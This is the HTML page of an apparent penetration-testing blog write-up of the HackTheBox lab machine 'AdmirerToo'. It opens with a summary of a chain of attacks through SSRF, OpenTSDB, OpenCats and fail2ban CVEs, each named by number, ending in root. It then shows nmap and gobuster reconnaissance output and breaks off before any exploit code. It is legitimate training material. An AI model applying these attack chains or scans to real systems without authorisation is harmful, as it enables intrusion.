<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="HackTheBox - AdmirerToo" />
<meta property="og:locale" content="en" />
<meta name="description" content="HackTheBox &quot;AdmirerToo&quot; wirteup is now available!" />
<meta property="og:description" content="HackTheBox &quot;AdmirerToo&quot; wirteup is now available!" />
<link rel="canonical" href="http://localhost:4000/posts/admirertoo/" />
<meta property="og:url" content="http://localhost:4000/posts/admirertoo/" />
<meta property="og:site_name" content="0xbro" />
<meta property="og:image" content="http://localhost:4000/assets/img/AdmirerToo/box-summary.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-03-28T00:00:00+02:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/AdmirerToo/box-summary.jpg" />
<meta property="twitter:title" content="HackTheBox - AdmirerToo" />
<meta name="twitter:site" content="@sec_0xbro" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-28T00:00:00+02:00","datePublished":"2023-03-28T00:00:00+02:00","description":"HackTheBox &quot;AdmirerToo&quot; wirteup is now available!","headline":"HackTheBox - AdmirerToo","image":"http://localhost:4000/assets/img/AdmirerToo/box-summary.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/admirertoo/"},"url":"http://localhost:4000/posts/admirertoo/"}</script>
<!-- End Jekyll SEO tag -->


  <title>HackTheBox - AdmirerToo | 0xbro
  </title>

  <!--
  Custom Favicons - using favicon.ico only
-->

<link rel="icon" type="image/x-icon" href="/assets/img/favicons/favicon.png">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.png">

  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/0xbro-light.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">0xbro</a>
    <p class="site-subtitle fst-italic mb-0">A penetration tester, vulnerability researcher, content creator & wannabe ethical hacker blog.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>

      <!-- Main tabs: Talks, Side projects, About (order 1-4) -->
      
        
          <li class="nav-item">
            <a href="/about/" class="nav-link">
              <i class="fa-fw fas fa-info-circle"></i>
              <span>ABOUT</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/timeline/" class="nav-link">
              <i class="fa-fw fas fa-timeline"></i>
              <span>TIMELINE</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/disclosure/" class="nav-link">
              <i class="fa-fw fas fa-handshake"></i>
              <span>DISCLOSURE</span>
            </a>
          </li>
        
      
        
      
        
      
        
      
        
      

      <!-- Separator -->
      <li class="nav-item nav-separator">
        <hr class="sidebar-divider">
      </li>

      <!-- Blog tabs: Archive, Categories, Tags (order 5+) -->
      
        
      
        
      
        
      
        
          <li class="nav-item">
            <a href="/categories/" class="nav-link">
              <i class="fa-fw fas fa-stream"></i>
              <span>CATEGORIES</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/projects/" class="nav-link">
              <i class="fa-fw fas fa-code"></i>
              <span>PROJECTS</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/tags/" class="nav-link">
              <i class="fa-fw fas fa-tags"></i>
              <span>TAGS</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/archives/" class="nav-link">
              <i class="fa-fw fas fa-archive"></i>
              <span>ARCHIVES</span>
            </a>
          </li>
        
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    

      
        <a
          href="https://github.com/0xb120"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    

      
        <a
          href="https://twitter.com/sec_0xbro"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
          
      

      
        <a
          href="https://www.linkedin.com/in/mattia-brollo-b4129614b/"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
          
        

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->

    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>HackTheBox - AdmirerToo</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>HackTheBox - AdmirerToo</h1>
    
      <p class="post-desc fw-light mb-4">HackTheBox &quot;AdmirerToo&quot; wirteup is now available!</p>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1679954400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Mar 28, 2023
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/AdmirerToo/box-summary.jpg" class="popup img-link preview-img shimmer"><img src="/assets/img/AdmirerToo/box-summary.jpg"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/sec_0xbro">0xbro</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="3489 words"
>
  <em>19 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">HackTheBox - AdmirerToo</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">HackTheBox - AdmirerToo</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <h2 id="resolution-summary"><span class="me-2">Resolution summary</span><a href="#resolution-summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>Web server enumeration allows to identify <strong>admirer-gallery.htb</strong> and subdomain enumeration allows to identify <strong>db.admirer-gallery.htb</strong></li>
  <li><strong>db.admirer-gallery.htb</strong> is vulnerable to <strong>Server Side Request Forgery</strong> (CVE-2021-21311) and allows to scan and retrieve information from internal services, including <strong>OpenTSDB</strong> running on port 4242</li>
  <li><strong>OpenTSDB 2.4.0</strong> is vulnerable to <strong>Remote Code Execution</strong> (CVE-2020-35476) but PoC does not work as it is, so further enumeration through service API is required to make it work and obtain a shell as opentsdb</li>
  <li>Local enumeration reveals <strong>old MySQL credentials inside a configuration file</strong> that can be <strong>reused</strong> to escalate to jennifer</li>
  <li>Local service enumeration reveals a <strong>local port 8080</strong> that can be <strong>forwarded</strong> remotely using ssh and runs a version of <strong>OpenCats</strong> vulnerable <strong>to PHP Object Injection</strong> (CVE-2021-25294)</li>
  <li>Local enumeration reveals other <strong>MySQL credentials</strong> that can be used to access opencats DB</li>
  <li>Opencat login form cannot be bypassed and admin‚Äôs credentials extracted from the user table cannot be cracked, however cats user has <strong>full grants</strong> on cats_dev DB, allowing to <strong>overwrite admin credentials</strong> and login.</li>
  <li>Local enuemration reveals that <strong>fail2ban</strong> is installed on the machine and is vulnerable to <strong>Remote Code Execution</strong> (CVE-2021-32749)</li>
  <li>PHP Code Injection and fail2ban Remote Code Execution can be <strong>chained together</strong> in order to write an arbitrary whois.conf and trick the server into using our machine as whois server. Once contacted, a script can be sent able to trigger the RCE in fail2ban during the sending of the notification emails.</li>
</ul>

<h3 id="improved-skills"><span class="me-2">Improved skills</span><a href="#improved-skills" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>Exploit SSRF to enumerate and attack internal servers</li>
  <li>Chain multiple vulnerabilities</li>
</ul>

<h3 id="used-tools"><span class="me-2">Used tools</span><a href="#used-tools" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>nmap</li>
  <li>gobuster</li>
  <li>Public PoC</li>
  <li>ssh (port forwarding)</li>
  <li>phpggc</li>
  <li>nc</li>
</ul>

<hr />

<h2 id="information-gathering"><span class="me-2">Information Gathering</span><a href="#information-gathering" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Scanned all TCP ports:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-p-</span> admirertoo.htb <span class="nt">-sS</span> <span class="nt">-oN</span> scan/all-tcp-ports.txt <span class="nt">-v</span>
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
4242/tcp  filtered vrml-multi-use
16010/tcp filtered unknown
16030/tcp filtered unknown
</pre></td></tr></tbody></table></code></div></div>

<p>Enumerated open TCP ports:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/CTFs/HTB/B2R/AdmirerToo]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-p22</span>,80,4242,16010,16030 admirertoo.htb <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-oN</span> scan/open-tcp-ports.txt
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-04-23 11:01 EDT
Nmap scan report <span class="k">for </span>admirertoo.htb <span class="o">(</span>10.10.11.137<span class="o">)</span>
Host is up <span class="o">(</span>0.036s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 <span class="o">(</span>RSA<span class="o">)</span>
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open     http           Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
|_http-title: Admirer
|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
4242/tcp  closed   vrml-multi-use
16010/tcp filtered unknown
16030/tcp filtered unknown
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>9.78 seconds
</pre></td></tr></tbody></table></code></div></div>

<h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="port-80---http-apache-httpd-2438-debian"><span class="me-2">Port 80 - HTTP (Apache httpd 2.4.38 ((Debian)))</span><a href="#port-80---http-apache-httpd-2438-debian" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><a href="/assets/img/AdmirerToo/Untitled.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled.png" alt="Untitled" loading="lazy"></a></p>

<p>Enumerated files and directories:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/CTFs/HTB/B2R/AdmirerToo]
‚îî‚îÄ<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://admirertoo.htb/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt <span class="nt">-t</span> 25
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://admirertoo.htb/
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 25
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2022/04/23 11:07:19 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 365] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://admirertoo.htb/css/]
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 364] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://admirertoo.htb/js/] 
/img                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 365] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://admirertoo.htb/img/]
/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 367] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://admirertoo.htb/fonts/]
/manual               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 368] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://admirertoo.htb/manual/]
</pre></td></tr></tbody></table></code></div></div>

<p>Discovered DNS <strong>admirer-gallery.htb</strong>:</p>

<p><a href="/assets/img/AdmirerToo/Untitled%201.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%201.png" alt="Untitled" loading="lazy"></a></p>

<p>VHOST enumeration:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/CTFs/HTB/B2R/AdmirerToo]
‚îî‚îÄ<span class="nv">$ </span>gobuster vhost <span class="nt">-u</span> admirer-gallery.htb <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:          http://admirer-gallery.htb
<span class="o">[</span>+] Method:       GET
<span class="o">[</span>+] Threads:      10
<span class="o">[</span>+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
<span class="o">[</span>+] User Agent:   gobuster/3.1.0
<span class="o">[</span>+] Timeout:      10s
<span class="o">===============================================================</span>
2022/04/23 11:18:02 Starting gobuster <span class="k">in </span>VHOST enumeration mode
<span class="o">===============================================================</span>
Found: db.admirer-gallery.htb <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2569]
</pre></td></tr></tbody></table></code></div></div>

<h3 id="dbadmirer-galleryhtb-adminer-478"><span class="me-2">db.admirer-gallery.htb (Adminer 4.7.8)</span><a href="#dbadmirer-galleryhtb-adminer-478" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><a href="/assets/img/AdmirerToo/Untitled%202.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%202.png" alt="Untitled" loading="lazy"></a></p>

<p><a href="/assets/img/AdmirerToo/Untitled%203.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%203.png" alt="Untitled" loading="lazy"></a></p>

<p>Enumerated MySQL version:</p>

<p><a href="/assets/img/AdmirerToo/Untitled%204.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%204.png" alt="Untitled" loading="lazy"></a></p>

<p>Enumerated user credentials:</p>

